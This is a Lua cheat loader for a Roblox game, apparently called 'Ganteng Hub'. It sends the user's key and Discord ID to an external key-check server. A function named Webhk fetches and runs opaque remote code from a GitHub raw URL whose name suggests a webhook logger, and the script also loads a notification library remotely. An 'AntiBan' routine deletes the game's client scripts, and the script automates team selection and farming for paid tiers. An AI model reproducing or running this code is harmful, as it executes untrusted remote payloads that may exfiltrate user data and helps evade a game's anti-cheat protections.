local request = (syn and syn.request) or (http and http.request) or http_request
local httpservice = game:GetService("HttpService")

local function GET(url, headers)
    return request({Url = url, Method = "GET", Headers = headers}).Body
end

local UsageApi = "https://code4zaa.xyz/api/usage/?"
local LuarmorApi = "https://code4zaa.xyz/api/luarmor/v3/ganteng_hub?"

local function checkPanel()
    local CheckKey = httpservice:JSONDecode(GET(string.format("%suser_key=%s&discord_id=%s", LuarmorApi, ScriptKey or script_key or "", DiscordID)))
    if CheckKey.pro_panel then 
        return "Pro Rank", CheckKey.pro_panel
    elseif CheckKey.basic_panel then
        return "Basic Rank", CheckKey.basic_panel
    end
end

local rankuser, response = checkPanel()
local PakeUIBaru
if rankuser == "Pro Rank" then
    PakeUIBaru = true
elseif rankuser == "Basic Rank" then
    PakeUIBaru = false
end
local SAT

function Webhk() 
loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxIDGubkuk/snjdjsndmdkdd/main/NwjejdnWbhook"))()
end

 function AntiBan()
     for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
         if v:IsA("LocalScript") then
             if v.Name == "General" or v.Name == "Shiftlock"  or v.Name == "FallDamage" or v.Name == "4444" or v.Name == "CamBob" or v.Name == "JumpCD" or v.Name == "Looking" or v.Name == "Run" then
                 v:Destroy()
             end
         end
     end
     for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts:GetDescendants()) do
         if v:IsA("LocalScript") then
             if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans"  or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp"  or v.Name == "PlayerList" then
                 v:Destroy()
             end
         end
     end
 end

Webhk() 
AntiBan()

local BijiKona = loadstring(game:HttpGet("https://raw.githubusercontent.com/VanciSonic/Lgtihb/main/notipIpong"))()

function N(label, text)
BijiKona:SendNotification(label, text)
end

if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main", 9e9):FindFirstChild("ChooseTeam") and getgenv().AutoSelectTeam then
    -- Team
    repeat task.wait() until game:IsLoaded()

    local player = game.Players.LocalPlayer
    repeat task.wait() until player and player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("Main")

    local chooseTeam = player.PlayerGui.Main.ChooseTeam
    local teamContainer = chooseTeam.Container

    local function activateTeamButton(team)
        for _, connection in pairs(getconnections(team.Frame.TextButton.Activated)) do
            connection.Function()
        end
    end

    repeat
        local userteam = getgenv().SelectTeam
        local v2 = userteam
        local teamName = string.find(v2, "Marine") and "Marines" or "Pirates"

        activateTeamButton(teamContainer[teamName])

        task.wait()
    until player.Team ~= nil and game:IsLoaded()
end
if getgenv().list and getgenv().list.Setting.StartHunt then
    if rankuser == "Pro Rank" then
        N("Ganteng Hub", "Start Auto Farm Bounty") 
        autofarmbfGh = false
    else
        N("Ganteng Hub", "Sorry, Auto Farm Bounty Now Only For Pro Rank Only") 
        N("Ganteng Hub", "Please Upgrade Your Rank To Pro") 
    end
elseif getgenv().Setting and getgenv().Setting.FruitFinder then
    if rankuser == "Pro Rank" then
        N("Ganteng Hub", "Start Auto Farm Fruit") 
        autofarmbfGh = false
    else
        N("Ganteng Hub", "Sorry, Auto Farm Fruit Now Only For Pro Rank Only") 
        N("Ganteng Hub", "Please Upgrade Your Rank To Pro") 
    end
elseif getgenv().Setting and getgenv().Setting.AutoFarmChest then
    N("Ganteng Hub", "Start Auto Farm Chest") 
    autofarmbfGh = false
else
    N("Ganteng Hub", "Start Ganteng Hub Premium") 
    wait(1.5) 
    autofarmbfGh = true
end

